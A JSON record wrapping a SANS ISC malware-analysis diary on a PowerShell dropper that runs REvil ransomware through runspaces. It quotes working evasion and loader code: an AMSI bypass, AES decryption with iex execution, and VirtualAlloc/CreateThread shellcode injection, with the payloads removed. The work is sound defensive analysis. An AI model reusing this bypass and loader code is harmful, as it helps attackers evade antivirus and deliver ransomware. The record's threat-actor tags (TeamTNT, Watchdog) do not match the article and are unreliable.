{
    "id": "28c5633f-1913-41e2-824f-c2d81e14fbc2",
    "created_at": "2023-01-12T15:00:43.825703Z",
    "updated_at": "2025-03-27T02:05:40.742369Z",
    "deleted_at": null,
    "sha1_hash": "2c1389094da7efd5a1c6ff8d830628e5f1f1b744",
    "title": "2021-01-21 - Powershell Dropping a REvil Ransomware",
    "authors": "",
    "file_creation_date": "2022-05-28T15:57:49Z",
    "file_modification_date": "2022-05-28T15:57:49Z",
    "file_size": 2775288,
    "plain_text": "# SANS ISC: InfoSec Handlers Diary Blog - SANS Internet Storm Center SANS Site Network Current Site SANS Internet Storm Center Other SANS Sites Help Graduate Degree Programs Security Training Security Certification Security Awareness Training Penetration Testing Industrial Control Systems Cyber Defense Foundations DFIR Software Security Government OnSite Training InfoSec Handlers Diary Blog\n\n**isc.sans.edu/diary/27012**\n\n## Powershell Dropping a REvil Ransomware\n\n### Published: 2021-01-21\n Last Updated: 2021-01-21 10:13:55 UTC\n by Xavier Mertens (Version: 1)\n 0 comment(s) I spotted a piece of Powershell code that deserved some investigations because it makes use of RunSpaces[1]. The file (SHA256:e1e19d637e6744fedb76a9008952e01ee6dabaecbc6ad2701dfac6aab149cecf) has a very low VT score: only 1/59![2].\n\n The technique behind RunSpaces is helpful to create new threads on the existing Powershell process, and you can simply add what you need to it and send it off running. Here is an example of Runspace created by the malicious script:\n```\n$wabyynegzji = [runspacefactory]::CreateRunspace()\n$wabyynegzji.ApartmentState = \"STA\"\n$wabyynegzji.ThreadOptions = \"ReuseThread\"\n$wabyynegzji.Open()\n$vkzggaes = [PowerShell]::Create()\n$vkzggaes.Runspace = $wabyynegzji\n$vkzggaes.AddScript($pqxsxzakx) | out-null\n$vkzggaes.BeginInvoke() | out-null\n\n The interesting line is the one which contains ‘AddScript’. It is used to attach the piece of Powershell code to be executed in the new threat. Here is the code (located in a separate Script Block):\n\n```\n\n-----\n\n```\n[Scriptblock]$pqxsxzakx {\n try{\n  [ref].Assembly.GetType('System.Management.Automation.Amsi' + 'Utils').GetField( \\\n   'amsi'+'InitFailed', 'NonPublic,Static').SetValue($null, $true)\n }catch{}\n}\n\n### This is a classic bypass for logging and AV detection[3]. Then, a second RunSpace is started:\n$mnibvakvi =[runspacefactory]::CreateRunspace()\n$mnibvakvi.ApartmentState = \"STA\"\n$mnibvakvi.ThreadOptions = \"ReuseThread\"\n$mnibvakvi.Open()\n$mnibvakvi.SessionStateProxy.SetVariable(\"gbwqmnxwc\",\n\"L6jelvDCcKXK9A/+Lqto/5i9HtEK4jSsSdITqsGlgtQ=\")\n$slqcphetxifbl = [PowerShell]::Create()\n$slqcphetxifbl.Runspace = $mnibvakvi\n$slqcphetxifbl.AddScript($zupcppfvxbxgvwbivbq) | out-null\n$slqcphetxifbl.BeginInvoke() | out-null\n\n This block of code will decrypt and inject the payload in the current Powershell process. Note that you can pass variables to a RunSpace. In the example above, \"gbwqmnxwc\" contains the decryption key of the payload:\n[Scriptblock]$zupcppfvxbxgvwbivbq = {\n function tyefcaneraxdmqsfh($gbwqmnxwc, $qpzspadssix, $iizcnwcbb) {\n  $uuvqwwqjjkcolarhdeox=New-Object\nSystem.Security.Cryptography.AesCryptoServiceProvider;\n  $uuvqwwqjjkcolarhdeox.Mode=\"CBC\";\n  $uuvqwwqjjkcolarhdeox.Padding = \"Zeros\";\n  $uuvqwwqjjkcolarhdeox.BlockSize = 128;\n  $uuvqwwqjjkcolarhdeox.KeySize = 256;\n  $uuvqwwqjjkcolarhdeox.IV = $qpzspadssix;\n  $uuvqwwqjjkcolarhdeox.Key = $gbwqmnxwc;\n  $lafcsowawwnwcm=$uuvqwwqjjkcolarhdeox.CreateDecryptor();\n  $trgkzwqbqqbuteoe=$lafcsowawwnwcm.TransformFinalBlock($iizcnwcbb, 0,\n$iizcnwcbb.Length);\n  return [System.Text.Encoding]::UTF8.GetString($trgkzwqbqqbuteoe).Trim([char]0)\n }\n $yweudaxvekawvopqdwdr = “___PAYLOAD_REMOVED___;\n $yweudaxvekawvopqdwdr = [System.Convert]::FromBase64String($yweudaxvekawvopqdwdr);\n $qpzspadssix = \"+ViLpnC7vTHGHv6nVAcTXw==\";\n $qpzspadssix = [System.Convert]::FromBase64String($qpzspadssix);\n $gbwqmnxwc = [System.Convert]::FromBase64String($gbwqmnxwc);\n $trgkzwqbqqbuteoe = tyefcaneraxdmqsfh $gbwqmnxwc $qpzspadssix\n$yweudaxvekawvopqdwdr;\n iex $trgkzwqbqqbuteoe;\n}\n\n The decrypted code is executed via Invoke-Expression(\"IEX\"). Here is the interesting part of the code which loads the required API calls for performing the injection:\n\n```\n\n-----\n\n```\n$VirtualAllocAddr Get ProcessAddr kernel32.dll ( Virt + ualA + lloc )\n$VirtualAllocDelegate = Get-DelType @([IntPtr], [UInt32], [UInt32], [UInt32])\n([IntPtr])\n$VirtualAlloc =\n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocA\n \\\n $VirtualAllocDelegate)\n$VirtualFreeAddr = Get-ProcessAddr kernel32.dll ('Vi'+'rtualFr'+'ee')\n$VirtualFreeDelegate = Get-DelType @([IntPtr], [Uint32], [UInt32]) ([Bool])\n$VirtualFree =\n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAd\n \\\n $VirtualFreeDelegate)\n$CreateThreadAddr = Get-ProcessAddr kernel32.dll (\"C\"+\"reat\"+\"eT\"+\"hre\"+\"ad\")\n$CreateThreadDelegate = Get-DelType @([IntPtr], [UInt32], [IntPtr], [IntPtr],\n[UInt32], [IntPtr]) ([IntPtr])\n$CreateThread =\n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadA\n $CreateThreadDelegate)\n$WaitForSingleObjectAddr = Get-ProcessAddr kernel32.dll\n(\"Wa\"+\"it\"+\"ForSi\"+\"ngl\"+\"eObje\"+\"ct\")\n$WaitForSingleObjectDelegate = Get-DelType @([IntPtr], [Int32]) ([Int])\n$WaitForSingleObject = \\\n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingle\n $WaitForSingleObjectDelegate)\n\n### The shellcode is injected and decoded:\n$hex_str = “__PAYLOAD_REMOVED__”\n$Shellcode = [byte[]] -split ($hex_str -replace '..', '0x$& ')\n[IO.File]::WriteAllBytes(\"c:\\shellcode.tmp\", $Shellcode)\nInvoke-Shcd $Shellcode\n\n Let’s have a look at the shellcode now. It’s not starting at offset 0x0 but around 0x770:\n\n```\n\n-----\n\n```\nremnux@remnux:/mnt/hgfs/MalwareZoo/20210116$ xxd s +1900 shellcode.tmp |head 20\n0000076c: 8b44 1624 8d04 580f b70c 108b 4416 1c8d .D.$..X.....D...\n0000077c: 0488 8b04 1003 c2eb db4d 5a90 0003 0000 .........MZ.....\n0000078c: 0004 0000 00ff ff00 00b8 0000 0000 0000 ................\n0000079c: 0040 0000 0000 0000 0000 0000 0000 0000 .@..............\n000007ac: 0000 0000 0000 0000 0000 0000 0000 0000 ................\n000007bc: 0000 0000 00f0 0000 000e 1fba 0e00 b409 ................\n000007cc: cd21 b801 4ccd 2154 6869 7320 7072 6f67 .!..L.!This prog\n000007dc: 7261 6d20 6361 6e6e 6f74 2062 6520 7275 ram cannot be ru\n000007ec: 6e20 696e 2044 4f53 206d 6f64 652e 0d0d n in DOS mode...\n000007fc: 0a24 0000 0000 0000 00c5 3aa4 0881 5bca .$........:...[.\n0000080c: 5b81 5bca 5b81 5bca 5bba 05cf 5a80 5bca [.[.[.[.[...Z.[.\n0000081c: 5bba 05c9 5a82 5bca 5bba 05ce 5a80 5bca [...Z.[.[...Z.[.\n0000082c: 5b5c a404 5b80 5bca 5b5c a401 5b86 5bca [\\..[.[.[\\..[.[.\n0000083c: 5b81 5bcb 5ba3 5bca 5b5c a41a 5b80 5bca [.[.[.[.[\\..[.[.\n0000084c: 5b16 05ce 5a9b 5bca 5b16 05c8 5a80 5bca [...Z.[.[...Z.[.\n0000085c: 5b52 6963 6881 5bca 5b00 0000 0000 0000 [Rich.[.[.......\n0000086c: 0000 0000 0000 0000 0050 4500 004c 0105 .........PE..L..\n0000087c: 0012 c4bf 5f00 0000 0000 0000 00e0 0002 ...._...........\n0000088c: 210b 010e 0000 b800 0000 2201 0000 0000 !.........\".....\n0000089c: 001e 4300 0000 1000 0000 d000 0000 0000 ..C.............\n\n### Let’s extract this executable and have a look at it. Let’s skip the non-interesting bytes:\nremnux@remnux:/mnt/hgfs/MalwareZoo/20210116$ tail -c +1926 shellcode.tmp\n>shellcode.exe\n\n The PE file (SHA256:2fc374346290aaf1060840a5125d9867f99d192b03bfbef94268c2b679d6f905) is unknown on VT but it’s a REvil ransomware. How did I learn this easily?\n\n When I’m teaching the SANS FOR610[4] class about malware analysis, I like to insist on the importance of using a lab completely disconnected from other networks because some weird things may (will!) happen… Because a picture is worth a thousand words, have a look at my lab:\n\n```\n\n-----\n\n### I simply put a breakpoint in my debugger… at the wrong place! I executed the code and the breakpoint was never reached but the ransomware did the job.\n\n About the ransomware itself, the ransomware notifies the victim (via a classic readme file) that files have been encrypted but also exfiltrated. As proof, they provide some URLs:\n```\n[+] Your secret data [+]\nWe have uploaded all your private information, if no payment comes from you, we will\npost\nproof:\nhxxps://ibb[.]co/thJQ77F\nhxxps://ibb[.]co/cbd1CW6\nhxxps://ibb[.]co/2FHfJp9\nhxxps://ibb[.]co/h8vf4Y1\nhxxps://ibb[.]co/MZ8WR2c\nhxxps://ibb[.]co/qkCjvp6\nhxxps://ibb[.]co/D4hp7WN\nhxxps://ibb[.]co/k6JcMpm\nhxxps://ibb[.]co/0ZB3GxF\n\n My sandbox being offline (network disconnected), there was no way to upload sample files to a cloud service. Files are just fake ones and do not belong to the victim!\n\n```\n\n-----\n\n### I tried to run the ransomware again, this time with a fake network, and no network traffic was generated. The URLs with files remain the same, like hardcoded. Finally, I visited the Onion website provided in the readme file:\n\n\n-----\n\n### They provide a tool to submit some files to prove they can decrypt them and it worked. My REMnux wallpaper was decrypted! Ouf!\n\n\n-----\n\n### Based on these screenshots, we have indeed a REvil or Sodinokibi as described Talos last year in a blog post[5] but this time, it seems the way the attackers drop the malware changed...\n\n [1] https://devblogs.microsoft.com/scripting/beginning-use-of-powershell-runspaces-part-1/\n\n [2] https://www.virustotal.com/gui/file/e1e19d637e6744fedb76a9008952e01ee6dabaecbc6ad27 01dfac6aab149cecf/detection\n\n [3] https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n\n [4] https://www.sans.org/cyber-security-courses/reverse-engineering-malware-malware- analysis-tools-techniques/\n\n [5] https://blog.talosintelligence.com/2019/04/sodinokibi-ransomware-exploits-weblogic.html\n\n Xavier Mertens (@xme)\n Senior ISC Handler - Freelance Cyber Security Consultant\n PGP Key\n\n Keywords: Malware PowerShell Ransomware REvil RunSpace 0 comment(s)\n\nJoin us at SANS! Attend Reverse-Engineering Malware: Malware Analysis Tools and\n### Techniques with Xavier Mertens in Amsterdam starting Aug 15 2022\n\n Top of page ×\n\n Diary Archives\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-01-21 - Powershell Dropping a REvil Ransomware.pdf"
    ],
    "report_names": [
        "2021-01-21 - Powershell Dropping a REvil Ransomware.pdf"
    ],
    "threat_actors": [
        {
            "id": "f809bfcb-b200-4988-80a8-be78ef6a52ef",
            "created_at": "2023-01-06T13:46:39.186988Z",
            "updated_at": "2025-03-27T02:00:03.016358Z",
            "deleted_at": null,
            "main_name": "TeamTNT",
            "aliases": [
                "Adept Libra"
            ],
            "source_name": "MISPGALAXY:TeamTNT",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c3ca592f-0669-49bd-ab5c-310007ab2fb4",
            "created_at": "2022-10-25T15:50:23.334495Z",
            "updated_at": "2025-03-27T02:00:55.445098Z",
            "deleted_at": null,
            "main_name": "TeamTNT",
            "aliases": [
                "TeamTNT"
            ],
            "source_name": "MITRE:TeamTNT",
            "tools": [
                "Peirates",
                "MimiPenguin",
                "LaZagne",
                "Hildegard"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535643,
    "ts_updated_at": 1743041140,
    "ts_creation_date": 1653753469,
    "ts_modification_date": 1653753469,
    "files": {
        "pdf": "https://archive.orkl.eu/2c1389094da7efd5a1c6ff8d830628e5f1f1b744.pdf",
        "text": "https://archive.orkl.eu/2c1389094da7efd5a1c6ff8d830628e5f1f1b744.txt",
        "img": "https://archive.orkl.eu/2c1389094da7efd5a1c6ff8d830628e5f1f1b744.jpg"
    }
}